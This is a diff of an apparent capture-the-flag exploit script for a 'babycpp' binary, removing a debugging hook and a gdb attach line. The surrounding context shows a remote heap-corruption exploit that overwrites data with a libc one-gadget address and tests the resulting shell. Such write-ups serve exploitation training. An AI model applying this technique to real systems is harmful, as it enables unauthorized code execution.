@@ -46,7 +46,6 @@ def exploit(host):
         try:
             r = remote(host, port)
             #r = process('./babycpp')
-            from beautyexp import hook; hook(r)
             new_array(2)
             set_str_element('\0'*0x10, 0, 0x10, 'a'*0x10)
             update_hash('\0'*0x10, 0x80000000, p16(0x5ce0))
@@ -85,7 +84,6 @@ def exploit(host):
             r.sendafter("Input your content:", p64(libc_base+0x4f322))
 
             # invoke
-            #gdb.attach(r, 'symbol-file ./babycpp.dbg\nb *(0x555555554000+%d)'%(0xE5B))
             new_array(1)
 
             r.sendline('echo xdd')
